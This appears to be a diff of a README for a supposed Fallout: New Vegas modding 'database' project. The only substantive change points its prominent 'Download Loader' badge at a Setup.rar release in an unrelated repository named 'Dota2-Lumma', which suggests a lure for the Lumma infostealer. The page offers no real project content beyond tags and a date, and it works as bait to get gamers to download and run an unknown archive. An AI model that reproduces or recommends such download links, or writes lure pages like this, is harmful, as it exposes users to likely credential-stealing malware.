@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Fallout: New Vegas Database
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Fallout-New-Vegas-Database` · Updated: 2026-11-04
 
 **Tags:** `fallout-new-vegas` `database` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
